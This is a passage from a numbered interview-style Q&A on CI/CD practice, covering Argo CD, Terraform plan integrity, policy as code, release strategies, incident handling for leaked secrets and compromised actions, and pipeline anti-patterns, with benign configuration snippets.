- **Manual PR**: a person opens a PR that changes the image tag in the production folder.
- **Automated PR**: after staging tests pass, CI opens the production PR, and someone approves it.
- **Promotion tools**: Kargo (from the Argo CD team) models stages and promotes "freight" (image versions, config) between them with checks. Flux has image automation for similar flows.

The promotion should move the exact same image digest and the same config change that was tested, not a rebuilt artifact.

## 368: What are Argo CD sync waves and hooks?

Sync waves set the order in which resources are applied, using an annotation. Lower waves go first, and Argo CD waits for each wave to be healthy.

```yaml
metadata:
  annotations:
    argocd.argoproj.io/sync-wave: "-1"
```

Hooks run resources at a specific phase, like a migration Job before the sync:

```yaml
metadata:
  annotations:
    argocd.argoproj.io/hook: PreSync
    argocd.argoproj.io/hook-delete-policy: HookSucceeded
```

Typical use: namespaces and CRDs first, then config and secrets, then a migration job as a PreSync hook, then the app.

## 369: What are the app-of-apps pattern and ApplicationSets in Argo CD?

- **App of apps**: one Argo CD Application points to a folder of other Application manifests. Syncing the parent creates all the children. Useful to bootstrap a cluster.
- **ApplicationSet**: a controller that generates Applications from a template and generators, such as a list of clusters, folders in a Git repo, or open pull requests.

```yaml
apiVersion: argoproj.io/v1alpha1
kind: ApplicationSet
metadata:
  name: services
spec:
  generators:
    - git:
        repoURL: https://github.com/my-org/gitops
        revision: main
        directories:
          - path: services/*
  template:
    metadata:
      name: "{{path.basename}}"
    spec:
      project: default
      source:
        repoURL: https://github.com/my-org/gitops
        targetRevision: main
        path: "{{path}}"
      destination:
        server: https://kubernetes.default.svc
        namespace: "{{path.basename}}"
```

ApplicationSets scale better: add a folder and a new app appears.

## 370: When would you choose Helm over Kustomize, or both?

- **Helm** is good for packaging software for others (with many options), for third-party apps you install, and when you need real templating logic or release history and rollback.
- **Kustomize** is good for your own apps where you want plain YAML and small per-environment patches. It's easier to read and review.
- **Both**: many teams install third-party charts with Helm and manage their own apps with Kustomize, or use Kustomize to patch a rendered Helm chart.

With GitOps, Argo CD renders Helm charts itself, so Helm's release history is not used. Git history becomes the rollback mechanism.

## 371: How do you make sure Terraform applies exactly what was reviewed?

The risk: a plan is reviewed on the PR, but by the time apply runs, the code, providers or real infrastructure changed, so apply does something different.

- Save the plan file in the plan job and apply that exact file (`terraform apply tfplan`). Terraform refuses to apply a saved plan if the state changed since.
- Store the plan as an artifact, linked to the commit, and protect it from changes.
- Pin provider versions with the `.terraform.lock.hcl` file.
- Lock state during apply, and serialize applies per state.
- Tools like Atlantis apply from the PR before merging, so the plan and apply are tied to the same commit.

Plan files can contain secrets, so treat them as sensitive artifacts.

## 372: What is policy as code in CI/CD?

Policy as code means writing rules as code that the pipeline checks automatically, instead of a document that people are supposed to follow.

- **OPA / Conftest** with Rego: check Terraform plans, Kubernetes manifests, Dockerfiles.
- **Kyverno**: Kubernetes policies in YAML.
- **Checkov, Trivy config, tfsec-style scanners**: built-in rules for IaC security.
- **HashiCorp Sentinel**: policies for HCP Terraform.

```rego
package main

deny contains msg if {
  input.kind == "Deployment"
  not input.spec.template.spec.securityContext.runAsNonRoot
  msg := "containers must run as non-root"
}
```

```bash
conftest test k8s/deployment.yaml
```

Rules are versioned, reviewed and tested like any other code, and every team gets the same checks.

## 373: How do you test infrastructure code?

- **Static checks**: `terraform fmt`, `terraform validate`, TFLint, security scanners, policy as code.
- **Plan review**: read the plan on every PR. Policies can check the plan JSON.
- **Unit-like tests**: `terraform test` (built into Terraform since 1.6) can run plan-only checks or apply to a temporary environment.
- **Integration tests**: Terratest (Go) or `terraform test` apply real resources in a sandbox account, check them, and destroy them.
- **Module versioning**: test shared modules in their own pipeline and release with tags.

Real-apply tests are slow and cost money, so run them for shared modules, not every small change.

## 374: How do you deploy across multiple cloud accounts?

A common setup has separate accounts or projects for dev, staging and production (and often per team) to limit blast radius.

- Create one deploy role per account, trusted through OIDC only by the right repo and environment.
- The pipeline assumes the role for the target account at deploy time.
- Use the same IaC modules with different variables per account.
- Keep shared things (DNS, networking, logging) in their own accounts with their own pipelines.
- Use organization-level guardrails (AWS SCPs, Azure Policy, GCP org policies) so even a pipeline with admin in one account can't break rules.

## 375: What is immutable infrastructure?

Immutable infrastructure means you never change servers after they are created. To deploy a change, you build a new image (container or VM image), start new instances from it, and remove the old ones.

Benefits: no configuration drift, every instance is identical, rollback is just switching back to the old image, and the pipeline tests exactly what runs. Containers made this the normal approach. The old style, where you SSH into servers and update them in place, leads to "snowflake" servers that nobody can recreate.

## 376: Are there cases where rebuilding per environment is acceptable?

"Build once, deploy many" is the rule, but there are exceptions:

- Static frontends where env vars are baked in at build time and runtime config is not practical. Then rebuild from the exact same commit and lock file, and ideally make builds reproducible.
- Mobile apps with different bundle IDs or signing per environment.
- Builds that must be signed with different keys for production.

Even then, the inputs should be identical except for the documented config, and the production build should run the same tests. If you can move config to runtime, do it.

## 377: What versioning schemes are common, and when do you use each?

- **SemVer** (`2.4.1`): libraries and APIs where users need to know about breaking changes.
- **CalVer** (`2026.10.2`): apps and tools released on a schedule, where "how old is this?" matters more than compatibility. Ubuntu and pip use it.
- **Commit SHA or build number**: internal services deployed continuously. Nobody cares about "version 3.2", only "which commit is running".
- **SemVer with build metadata** (`1.4.0+build.512`) or pre-releases (`2.0.0-rc.1`) for test builds.

For continuously deployed services, using the commit SHA as the version is simple and fully traceable.

## 378: Fixed or independent versioning in a monorepo?

- **Fixed (locked)**: all packages share one version and are released together. Simpler to understand, but packages get new versions without changes. Angular and Babel have used this.
- **Independent**: each package has its own version and changelog. More accurate, but harder to track which versions work together.

Changesets, Nx Release, Lerna and release-please support both. Fixed versioning fits packages that are always used together. Independent fits collections of separate libraries.

## 379: What is a release train?

A release train ships on a fixed schedule, for example every two weeks. Whatever is ready and merged before the cutoff goes on the train. What isn't ready waits for the next one. Chrome and Firefox work this way with a four-week cycle.

It gives a predictable schedule for users, QA and docs, and stops releases being delayed for "one more feature". It fits mobile apps, desktop software and products with external customers better than web services that deploy many times a day.

## 380: How do you automate backports to release branches?

When you support several release lines (like `2.x` and `3.x`), a fix merged to main may need to go into older branches too.

- Label the PR (like `backport release/2.x`) and let a bot cherry-pick the merged commit and open a PR to that branch. There are GitHub Actions and bots for this, and GitLab has a cherry-pick button and API.
- CI runs on the backport PR like any other.
- If the cherry-pick has conflicts, the bot reports it and a person does it manually.

Keep the number of supported release lines small. Every extra branch multiplies CI and maintenance work.

## 381: How do staged rollouts work for mobile apps?

App stores let you release a new version to a percentage of users:

- **Google Play** staged rollouts: choose a percentage, increase it over time, or halt the rollout.
- **Apple App Store** phased release: spreads automatic updates over seven days, and you can pause.

You can't roll back an installed app, so you halt the rollout and ship a fixed version. That's why mobile teams rely on feature flags and remote config (to turn off broken features), crash reporting with version tags, and minimum version checks that force very old versions to update.

## 382: How do you handle CD for desktop or client-side apps that users install?

- Build signed installers for each platform in CI (code signing and macOS notarization are required for a smooth install).
- Publish to update channels like `beta` and `stable`. Electron apps often use `electron-updater`, others use the Microsoft Store, Mac App Store or Sparkle.
- Roll out gradually: some update frameworks support staged rollouts by percentage.
- Keep the backend compatible with many client versions, since users don't update right away.

Like mobile, you can't take a release back from users' machines, so test well before the stable channel.

## 383: How is CD for a library different from CD for a service?

For a service, "delivered" means running in production, and you control every instance. For a library, "delivered" means a new version is published, and users decide when to upgrade.

- Breaking changes need major versions, deprecation periods and migration guides.
- You can't roll back. You can only publish a fixed version (and deprecate the bad one).
- You test against a range of runtimes and dependency versions (matrix builds).
- Release notes and versioning are part of the product.
- Some projects run their consumers' tests against new versions before release.

## 384: How do you test database migrations realistically in CI?

- Run migrations from zero on an empty database to check the full chain.
- Run new migrations against a copy of the current production schema (schema only, or anonymized data) to catch problems with real data, like a `NOT NULL` column on a table with existing rows.
- Measure how long each migration takes on production-sized data, and check which locks it takes.
- Check that the previous app version still works after the migration (for rolling deploys).
- Lint migrations with tools like Squawk (Postgres) that flag dangerous operations.

## 385: What does CI/CD look like for machine learning models?

ML adds data and models to the usual code pipeline:

- **Code CI**: tests for feature code and training code.
- **Data checks**: validate schema, missing values and data drift before training.
- **Training pipeline**: reproducible runs with versioned data, code and parameters (tools like MLflow, DVC, Kubeflow, SageMaker Pipelines).
- **Model evaluation**: compare metrics against the current production model, and only register it if it's better.
- **Model registry**: versioned models with stages like staging and production.
- **Deployment**: canary or shadow deployments for models, with monitoring of prediction quality and drift.

The hard part is that the "artifact" depends on data, not only code.

## 386: How do you govern shared pipeline templates across an organization?

- Keep templates (reusable workflows, GitLab components, Jenkins shared libraries) in a central repo with owners.
- Version them with semantic tags. Teams pin a version, and bots open PRs to update.
- Test templates in their own pipeline using sample projects.
- Keep a changelog and announce breaking changes.
- Enforce a minimum set (like security scans) with org-level required workflows or policies, while letting teams add their own steps.
- Track which repos use which version, to find laggards.

Changing a template that 300 repos use without versioning is one of the fastest ways to break a whole company's CI.

## 387: What is platform engineering and how does it relate to CI/CD?

Platform engineering is building internal tools and "golden paths" that make it easy for product teams to build, deploy and run software. CI/CD is a big part of it: the platform team provides runners, pipeline templates, deployment tooling, environments and observability as a product.

A golden path might be: "run this template, get a repo with CI, a Dockerfile, Kubernetes manifests, staging and production environments, dashboards and alerts". Teams can go off the path, but the path is the easiest choice. Backstage is a popular tool for the developer portal side.

## 388: What are common mistakes when measuring DORA metrics?

- Using them to compare or rank teams, which leads to gaming (like splitting deploys to raise frequency).
- Measuring only deployment frequency and ignoring stability metrics.
- Counting deploys to staging or deploys with no real changes.
- Defining "failure" differently across teams, so numbers can't be compared.
- Measuring lead time from PR open instead of first commit (or the other way around) without saying so.
- Looking at averages only, which hide long tails.

Use them to track a team's own trend over time and to start conversations about bottlenecks.

## 389: How do you find the bottleneck in a delivery process?

Map the path from idea to production and measure the time spent in each step, including waiting:

- Time from first commit to PR opened
- Time waiting for first review
- Time in review and rework
- CI run time and queue time
- Time waiting for merge, then for deploy
- Time waiting for approvals or release windows

Usually waiting time is much bigger than working time. Fixing a 10-minute pipeline doesn't help much if PRs wait two days for review.

## 390: The PR pipeline takes 45 minutes. How would you get it to 10?

1. **Measure**: get per-job and per-step durations, and the critical path. Check queue time.
2. **Parallelize**: split one big job into lint, types, unit, build, E2E running at the same time.
3. **Shard** the slowest test suites across several runners.
4. **Cache** dependencies, Docker layers and build outputs. Add a remote cache in a monorepo.
5. **Run only what's affected** with Nx/Turborepo or path filters.
6. **Fix slow tests**: find the slowest 20 tests, often things like real sleeps or full database resets per test.
7. **Move slow suites**: full E2E or performance tests to the merge queue or nightly, keeping a smoke set on PRs.
8. **Bigger runners** for CPU-bound steps.

Track the time each week so it doesn't creep back up.

## 391: A deploy broke production on Friday at 5 PM. What do you do?

1. **Stop the bleeding**: roll back to the last good version or turn off the feature flag. Don't try to debug in production first.
2. **Confirm recovery**: check error rates, key metrics and user reports.
3. **Communicate**: tell the team and stakeholders what happened and that it's under control.
4. **Stop further deploys** until the cause is understood.
5. **Investigate** with logs, traces and the diff of the bad release.
6. **Fix forward** with a proper fix and tests, through the normal pipeline.
7. **Blameless postmortem**: why did tests, canary or monitoring not catch it? Add the missing checks.

The real lesson is often not "don't deploy on Friday" but "make deploys safe enough that the day doesn't matter".

## 392: You find that a secret was printed in public CI logs. What do you do?

1. **Revoke or rotate the secret immediately**. Assume it was copied.
2. Delete the logs or the run if possible, to reduce exposure (but rotation is what really matters).
3. Check the provider's audit logs for any use of the secret since it was exposed.
4. Find how it leaked: a debug print, a tool's verbose mode, a compromised action, an encoded value that bypassed masking.
5. Fix the cause and check other repos for the same pattern.
6. Consider replacing that secret with OIDC or short-lived credentials so it can't happen again.

## 393: Flaky E2E tests block merges several times a day. How do you fix this?

- **Short term**: quarantine the known flaky tests so they still run and report, but don't block. Assign owners.
- **Measure**: track which tests fail on retry, and how often.
- **Fix common causes**: replace fixed waits with waiting for conditions (Playwright's auto-waiting assertions), isolate test data per test, mock unstable third-party services, make tests independent of order.
- **Improve the environment**: dedicated test environments, stable seed data, enough resources.
- **Rebalance**: move logic checks down to unit and integration tests, and keep E2E for a few critical flows.

Set a rule that a quarantined test must be fixed or deleted within a set time.

## 394: Main is red several times a week. What would you change?

- Find out why: semantic merge conflicts, flaky tests, tests that only run on main, environment problems, or people merging without green checks.
- Make the same checks required on PRs that run on main, so main doesn't do anything new.
- Add a merge queue so PRs are tested against the latest main before merging.
- Make reverting the default: if main is red and the fix isn't obvious in minutes, revert.
- Alert the team when main goes red, and make someone responsible (a build cop or the author).
- Fix or quarantine flaky tests.

## 395: How would you migrate 200 repositories from Jenkins to GitHub Actions?

1. **Inventory**: list all Jenkins jobs, plugins, credentials, agents and what each does. Group repos by type (Node service, Java library, frontend...).
2. **Build templates**: one reusable workflow per type that covers most cases.
3. **Pilot** on a few repos per type, run both systems in parallel, compare results.
4. **Automate the rollout**: a script or GitHub Actions Importer creates PRs adding the workflow to each repo.
5. **Move secrets** to org or environment secrets, or better, to OIDC.
6. **Switch required checks** to the new workflows once they're stable.
7. **Turn off Jenkins jobs** repo by repo, then remove credentials and shut down Jenkins.

Plan for the long tail: the last 10% of special jobs takes the most time.

## 396: A third-party action you use was compromised. What do you do?

1. Find every workflow in the org that uses it (code search for `uses: owner/action`).
2. Stop using it: remove it, or pin to a known-good commit SHA verified by the community or the maintainer.
3. Check logs of runs during the affected period for signs of leaked secrets.
4. Rotate every secret those workflows had access to, starting with the most powerful.
5. Check for follow-up damage: new tokens, pushed commits, published packages, changes in cloud accounts.
6. Prevent it next time: SHA pinning enforced by policy, allow-lists for actions, minimal permissions, network egress monitoring.

## 397: The deploy succeeded, but users see errors or the old version. What could be wrong?

- **CDN or browser cache**: old `index.html` is cached and points to asset files that no longer exist, or new HTML is served with old JavaScript.
- **Service worker** serving the old app until all tabs are closed.
- **Old pods still running**: the rollout is stuck halfway, or the readiness check passes too early.
- **Config not updated**: new code with old environment variables or feature flags.
- **Database migration not run**, or run against the wrong database.
- **Load balancer** still sending some traffic to old instances.
- **Users with old tabs open** calling API endpoints that changed.

Check the deployed version on each layer: what the CDN serves, what the pods report on `/version`, and what the browser loaded.

## 398: How do you avoid broken frontend deployments caused by missing JavaScript chunks?

When you deploy a new build, files like `chunk-abc123.js` are replaced with `chunk-def456.js`. A user with the old page open clicks something that lazy-loads `chunk-abc123.js`, which is gone, and gets a blank screen or an error.

Fixes:

- **Keep old assets** for some time after a deploy (don't use `--delete` on every sync, clean up old files later).
- **Atomic deploys**: hosts like Vercel, Netlify and Cloudflare Pages keep every deployment's files available.
- **Handle the error**: catch chunk load errors and reload the page once (Vite fires a `vite:preloadError` event for this).
- Cache hashed assets forever and `index.html` never.

## 399: What deployment problems do service workers cause?

A service worker can cache the app shell and serve it even after you deploy a new version. Users may keep running an old version for days.

- By default, a new service worker waits until all tabs using the old one are closed.
- Calling `skipWaiting()` activates it right away, but then the old page may run with a new worker and new cache, which can break.
- A common pattern: detect the new version, show "a new version is available, reload", and reload on click.
- Never cache the service worker file itself for a long time (serve it with `Cache-Control: no-cache`).
- Have a "kill switch" version of the worker that removes itself, in case a bad one gets deployed.

## 400: What is version skew between frontend and backend, and how do you handle it?

After a deploy, a user's browser may still run the old frontend while the backend is new, or the other way around during a rollout. If the API changed in a breaking way, requests fail.

- Keep APIs backward compatible for at least one release.
- Version APIs (`/v2/...`) for bigger changes.
- Send the frontend version in a header, so the backend can tell old clients to reload.
- Some platforms route requests from an old frontend to the matching old backend version for a while (Vercel calls this "skew protection").
- Deploy the backend first when it adds fields, and the frontend first when it stops using them.

## 401: Why should configuration changes go through a pipeline too?

Many big outages were caused by config changes, not code: a bad feature flag, a wrong firewall rule, a typo in a routing config pushed everywhere at once. Config is code that runs in production, so treat it that way:

- Store it in Git and review it.
- Validate it in CI (schema checks, dry runs, policy checks).
- Roll it out gradually, just like code (one region or a small percentage first).
- Make rollback as easy as for code.

Global config systems that push changes to every server within seconds are especially dangerous without staged rollout.

## 402: How do you manage dependency updates across hundreds of repositories?

- Run Renovate or Dependabot on every repo with a shared org-level config preset.
- Group updates (all minor dev dependencies in one PR) and schedule them, so teams aren't flooded.
- Auto-merge low-risk updates when CI passes, with a minimum release age.
- Track how far behind each repo is (for example, how many major versions behind on the framework).
- For critical security fixes, have a way to push PRs to every affected repo quickly, and dashboards to see who merged.
- Shared libraries and templates should be updated first, since many repos depend on them.

## 403: When is it safe to auto-merge dependency updates?

Auto-merge is safe when you trust that CI would catch breakage:

- Good test coverage of the code that uses the dependency
- Type checking, which catches many API changes
- Updates limited to patch and minor versions, or dev-only dependencies
- A minimum release age, so brand-new (possibly malicious or broken) versions aren't merged right away
- Merge queue or tests on the merge result
- Easy rollback if something slips through

Major versions and runtime dependencies of critical services usually still need a human look.

## 404: Could you rebuild a release from two years ago? Why does it matter?

Often you can't, because base images, packages or tools have changed or disappeared. It matters when you need to patch an old version that a customer still runs, reproduce an old bug, or prove to an auditor what was in a release.

To make it possible:

- Store release artifacts permanently in an artifact repository, not just as CI artifacts.
- Pin base images by digest and keep copies in your own registry.
- Commit lock files and pin tool versions.
- Mirror dependencies in a private proxy that keeps old versions.
- Keep the pipeline definition in the same repo as the code, so the old commit includes how it was built.

## 405: How do retention requirements affect CI/CD in regulated companies?

Rules like SOX, PCI DSS, HIPAA or internal policies may require keeping evidence for years: who approved a change, which tests ran, what was deployed and when.

CI tools usually keep logs and artifacts for weeks or months, not years. So pipelines often export the important evidence (approvals, test reports, deploy records, SBOMs, signatures) to long-term storage or a compliance system. Make sure it's write-once (for example S3 Object Lock) so it can't be changed later.

## 406: How do you trace a production change back to its ticket and code?

Build a chain of links:

- Commits and PRs reference a ticket ID (enforced by a PR check if needed).
- The pipeline run is linked to the commit SHA.
- The artifact (image) is tagged with the SHA and has provenance pointing to the pipeline run.
- The deployment record names the artifact and the environment, with the approver.
- Monitoring and error tools tag events with the release version.

Then from an error in Sentry you can go: release, commit, PR, ticket, reviewer. Jira, GitHub, GitLab and Azure DevOps have integrations that show deployments on tickets.

## 407: How do you reconcile a Change Advisory Board with continuous delivery?

A CAB that meets weekly to approve every change doesn't fit with deploying many times a day, and research (including the DORA reports) shows heavy external approval doesn't reduce failures.

A common approach:

- **Standard changes**: small, low-risk changes that go through the normal pipeline with peer review and automated checks are pre-approved.
- **Normal changes**: higher risk ones get an approval in the pipeline from the right person.
- **Emergency changes**: fast path with review after the fact.

The pipeline creates the change records automatically, so the audit trail exists without meetings. The CAB then reviews the process and metrics, not individual changes.

## 408: What extra requirements does CI/CD have in regulated industries?

- **Separation of duties**: the author can't approve or deploy alone.
- **Traceability**: every production change linked to a requirement or ticket, approval and test evidence.
- **Validated pipelines**: changes to the pipeline itself are controlled and reviewed.
- **Access control**: no direct production access for developers, break-glass with logging.
- **Evidence retention** for years.
- **Security scans** with documented handling of findings.

Automation actually helps compliance, because a pipeline enforces the same rules every time and records everything, which manual processes can't.

## 409: What happens if your CI system itself goes down?

If CI is the only way to deploy, a CI outage means you can't ship fixes. Plan for it:

- Keep pipeline logic in scripts that can run outside the CI tool.
- Have a documented manual (break-glass) deploy procedure with the same artifacts.
- For self-hosted CI, back up config and data, and keep the setup as code (JCasC for Jenkins, Terraform for runners) so it can be rebuilt.
- For hosted CI, know their status page and consider self-hosted runners as a fallback for critical deploys.
- GitOps helps: if Argo CD is running, you can deploy by committing to the config repo even when CI is down.

## 410: What is a break-glass procedure?

Break-glass is a documented, emergency way to bypass the normal process, for example getting temporary admin access to production or deploying without the usual approvals during an incident.

Good break-glass procedures:

- Need a clear reason and are only for emergencies
- Give time-limited access
- Alert security or leadership when used
- Log everything that's done
- Are reviewed after each use

If break-glass is used often, the normal process is too slow or broken.

## 411: What problems do large Jenkins installations usually have?

- **Plugin hell**: hundreds of plugins with version conflicts, abandoned plugins and security issues. Upgrades are scary.
- **Controller as a bottleneck**: one big controller with thousands of jobs gets slow and is a single point of failure.
- **Configuration in the UI**: jobs and settings clicked together over years, with nobody knowing how they work.
- **Snowflake agents** with tools installed by hand.
- **Groovy complexity** in shared libraries that only one person understands.

Fixes include splitting into several controllers, Configuration as Code (JCasC), Job DSL or Jenkinsfiles for all jobs, ephemeral agents and removing unused plugins, or migrating to a different CI system.

## 412: What limits of GitHub Actions should you know about?

Some limits that matter when designing pipelines (check the docs, since they change):

- A job on GitHub-hosted runners can run up to 6 hours.
- A workflow run can last up to 35 days, including waiting for approvals.
- A matrix can create up to 256 jobs per workflow run.
- Caches are limited per repository (10 GB by default), with older entries evicted.
- There are limits on concurrent jobs per account, depending on the plan.
- API rate limits apply to `GITHUB_TOKEN` calls.
- Scheduled workflows can be delayed, and the shortest interval is every 5 minutes.

Hitting these limits often means a pipeline should be split or redesigned.

## 413: What pitfalls do GitLab's rules:changes have?

`rules:changes` decides if a job runs based on changed files, but "changed compared to what?" depends on the pipeline type:

- In **merge request pipelines**, it compares with the target branch, which is what you usually want.
- In **branch pipelines**, it compares with the previous push. On the first push of a new branch, or when the push includes many commits, results can be surprising (on new branches it is treated as true for all files).
- In **tag and scheduled pipelines**, `changes` is always true.

Use `changes:compare_to: refs/heads/main` to compare against a fixed branch, and prefer merge request pipelines for path-based logic.

## 414: How do you design fan-out and fan-in in a pipeline?

**Fan-out** is splitting work into many parallel jobs (test shards, a matrix of platforms, one job per service). **Fan-in** is one job that waits for all of them and combines results (merging coverage reports, a single "all checks passed" job, deploying after all builds).

```yaml
jobs:
  test:
    strategy:
      matrix:
        shard: [1, 2, 3, 4]
    runs-on: ubuntu-latest
    steps:
      - run: echo "shard ${{ matrix.shard }}"

  all-tests-passed:
    if: always()
    needs: test
    runs-on: ubuntu-latest
    steps:
      - run: test "${{ needs.test.result }}" = "success"
```

Using `if: always()` with a result check on the fan-in job makes it a reliable single required check. Fan-out has fixed overhead per job (runner start, checkout, install), so very small shards can make things slower.

## 415: What is remote build execution?

With remote execution, a build tool like Bazel sends individual build and test actions to a cluster of workers instead of running them on the CI runner. Combined with a remote cache, thousands of actions can run in parallel, and results are shared across all CI runs and developers.

It needs hermetic builds, because actions run on different machines with only the declared inputs. Services like BuildBuddy, EngFlow and NativeLink, or self-hosted Buildbarn and Buildfarm, provide it. It's mostly used in very large monorepos.

## 416: How would you cut CI costs for a large engineering org?

- **See the spend**: break costs down by repo, workflow and runner type.
- **Remove waste**: canceled-but-running duplicates, workflows running on every push to every branch, jobs with no timeouts, nightly jobs nobody reads.
- **Right-size runners**: big runners for CPU-heavy work only, small ones for lint and simple jobs.
- **Reuse work**: caches, remote build caches, affected-only builds.
- **Cheaper compute**: self-hosted runners on spot instances or your own Kubernetes cluster for high volume.
- **Avoid expensive OSes** unless needed.
- **Storage**: shorter artifact retention and registry cleanup.

Check that savings don't make pipelines slower, since developer waiting time usually costs more than CI minutes.

## 417: How do you keep base images up to date?

- Use a small set of approved base images, ideally built by a platform team.
- Let Renovate or Dependabot update `FROM` lines, pinned by digest, so each update is a reviewed PR.
- Rebuild app images when the base image changes, even if the app code didn't, so OS security fixes get deployed.
- Scan running images on a schedule and alert when a fixed version is available.
- Prefer minimal bases (distroless, Alpine, Chainguard-style images, or slim variants) to reduce the number of packages that need patching.

## 418: How do you handle the flood of vulnerability findings from scanners?

Scanners often report hundreds of CVEs, and most don't matter for your app. Practical triage:

- Focus on what's reachable and exploitable: is the vulnerable function used? Is the package only in dev dependencies or a build stage?
- Fail builds only for high and critical issues that have a fix available.
- Use smaller base images to reduce noise.
- Record decisions with VEX (Vulnerability Exploitability eXchange) documents or ignore files with a reason and expiry date, so the same finding isn't triaged again every week.
- Use EPSS scores and the CISA KEV list to prioritize what's actually exploited.

The goal is that a red security check means "act now", not "the usual noise".

## 419: How does npm trusted publishing improve package security?

Trusted publishing links an npm package to a specific CI workflow (GitHub Actions or GitLab CI). When that workflow runs `npm publish`, npm verifies the OIDC token from the CI provider and allows the publish, without any npm token stored as a secret.

Benefits:

- No long-lived publish token that can be stolen from CI or a developer's machine.
- Provenance is attached automatically, so users can see which repo and workflow built the package (`npm audit signatures` checks it).
- Publishing is tied to the workflow, so even a maintainer's stolen password can't publish from a laptop if you turn off token-based publishing.

After the npm token-stealing attacks in 2025, npm pushed strongly in this direction and tightened token rules.

## 420: How do you test risky infrastructure changes safely?

- Review the plan carefully, especially anything marked "destroy" or "replace". Policy checks can block destroys of critical resources.
- Use `prevent_destroy` lifecycle rules on resources like databases.
- Apply to dev and staging first, with the same modules and similar settings.
- For network or IAM changes, use temporary test environments, or tools that simulate access (like AWS IAM policy simulator).
- Do changes in small steps rather than one huge apply.
- Have a tested rollback plan, and apply during low-traffic times for very risky changes.

## 421: How do you apply canary ideas to infrastructure and config changes?

- Roll out changes to one cluster, node pool or region first.
- For Kubernetes cluster upgrades, upgrade a non-production cluster, then one production cluster, then the rest.
- For load balancer or CDN config, apply to a test hostname first, then a small share of traffic if the provider supports it.
- For feature flags and remote config, use percentage rollouts.
- For database parameter changes, change a replica first.

The same rule applies: a small blast radius first, watch, then expand.

## 422: When would you use a database restore as a rollback, and what are the risks?

If a release corrupted data or ran a bad migration, restoring from a backup or point-in-time recovery (PITR) may be the only way back. Risks:

- **Data loss**: everything written after the restore point is lost, unless you replay or merge it.
- **Time**: restoring a large database can take hours.
- **Consistency** with other systems (caches, search indexes, other services' databases, payments already processed).

So it's a last resort. Test restores regularly so you know how long they take, and prefer fixing data with targeted scripts when you can.

## 423: How does chaos engineering fit into CI/CD?

Chaos engineering injects failures on purpose (killing pods, adding latency, failing a dependency) to check that the system handles them. In a CD context:

- Run chaos experiments against staging as a pipeline stage, and fail if the system doesn't recover within the expected time.
- Verify that deployments themselves are safe: kill pods during a rollout, or fail health checks, and check that rollback works.
- Run experiments in production carefully, with small scope and a stop button.

Tools include Chaos Mesh and LitmusChaos for Kubernetes, AWS Fault Injection Service and Gremlin.

## 424: How do you detect performance regressions in CI without too much noise?

Shared CI runners give noisy timing results, so a naive "fail if 5% slower" check fails randomly.

- Use dedicated or bare-metal runners for benchmarks, with stable CPU settings.
- Run benchmarks several times and compare statistically (for example median and confidence intervals).
- Compare against the base branch measured in the same job, not an old stored value.
- Count instructions or allocations instead of wall time where possible, since those are more stable.
- Track trends over time, and alert on sustained changes instead of single runs.

Tools like Bencher, CodSpeed and `github-action-benchmark` help store and compare results.

## 425: How close to production should staging be, and is it worth it?

The closer staging is to production, the more bugs it catches, but full copies are expensive and still never identical (traffic, data volume, real users).

Worth matching:

- Same deployment process and artifacts
- Same runtime versions, OS, and infrastructure types
- Same config structure (with different values)
- Realistic data shape (anonymized or generated)

Often not worth matching: full size and full traffic. Many teams accept a smaller staging and rely on canaries, feature flags and observability in production for the rest.

## 426: How do you handle personal data in test and staging environments?

- Don't copy production data with real personal data into lower environments. It breaks privacy laws like GDPR and is a common source of leaks.
- Use generated data, or anonymize production dumps (mask names, emails, addresses, IDs) in a controlled job before anyone else gets access.
- Make anonymization part of a pipeline with checks, not a one-off script.
- Limit access to any environment that does have real data, and treat it like production.

## 427: How do you roll out changes in a multi-tenant SaaS product?

- Use tenant-aware feature flags to release to internal tenants, then beta customers, then everyone.
- If tenants have separate infrastructure (cell-based or per-tenant deployments), deploy to cells in waves, starting with low-risk ones.
- Let big customers opt into early or late update rings if they need it.
- Keep database migrations safe for all tenants, and run per-tenant migrations in batches.
- Monitor per tenant, since a bug may only affect tenants with unusual data or settings.

## 428: How do you do canary deployments for AWS Lambda?

Lambda versions are immutable snapshots of code and config, and aliases point to versions. An alias can split traffic between two versions by weight.

```bash
aws lambda update-alias \
  --function-name checkout \
  --name live \
  --function-version 42 \
  --routing-config '{"AdditionalVersionWeights":{"43":0.1}}'
```

This sends 10% of traffic to version 43. AWS CodeDeploy (used by SAM) automates it with options like `Canary10Percent5Minutes` or `Linear10PercentEvery1Minute`, and can roll back when CloudWatch alarms fire. API Gateway stages and canary settings offer a similar approach for APIs.

## 429: Why should deploy scripts be idempotent?

An idempotent deploy gives the same result whether it runs once or several times. This matters because pipelines get retried, runners die halfway, and people re-run jobs.

- Use declarative tools (`kubectl apply`, `helm upgrade --install`, Terraform) instead of "create" commands that fail if things exist.
- Make migrations track what has already run.
- Avoid steps like "append this line to the config" that add it again on every run.
- Check for existing state before creating resources.

If re-running a failed deploy is risky, people will be afraid to do it during an incident.

## 430: How can two pipelines deploy out of order, and how do you prevent it?

Commit A is merged, then commit B. Both pipelines start. If B's pipeline is faster, B deploys first, then A's pipeline finishes and deploys the older commit over the newer one.

Fixes:

- Use concurrency groups that queue deploys and cancel pending older ones.
- In the deploy step, check that the commit being deployed is newer than what's running (for example, that it's an ancestor of main's HEAD and newer than the current version).
- Use GitOps, where the config repo's latest commit wins, and CI updates it in order.
- Deploy from a single pipeline that always picks the latest successful build.

## 431: How does database branching help preview environments?

Some managed databases (like Neon, PlanetScale and Supabase) can create a branch of a database in seconds, using copy-on-write storage. A preview environment gets its own branch with the production-like schema (and maybe anonymized data), without copying the whole database.

The pipeline creates a branch for each PR, runs migrations on it, points the preview app to it, and deletes it when the PR closes. This makes it realistic to test migrations and data-heavy features per PR at low cost.

## 432: How do you combine a merge queue with affected-only builds in a monorepo?

The merge queue tests the combined change of several PRs, so "affected" must be computed against the queue's base (the target branch tip), not each PR's original base.

- In the `merge_group` event, use the base and head SHAs provided by the event for `nx affected` or similar tools.
- Make one aggregated required check that passes when the affected jobs pass or are skipped.
- Use the remote cache, since many projects in the queue build will already be cached from the PR runs.

If affected computation is wrong in the queue, either everything runs (slow) or nothing does (unsafe), so test this setup carefully.

## 433: What are common anti-patterns in pipelines?

- Huge YAML files with complex logic that can't be run or tested locally
- Copy-pasted pipelines across repos that slowly drift apart
- Builds that depend on things installed by hand on runners
- Rebuilding artifacts per environment
- Deploys that need someone to SSH in afterwards
- Secrets shared across all repos with full admin rights
- Ignored red builds and "just re-run it" culture
- Manual approval gates that everyone clicks without looking
- One giant job instead of parallel jobs
- No timeouts and no cleanup

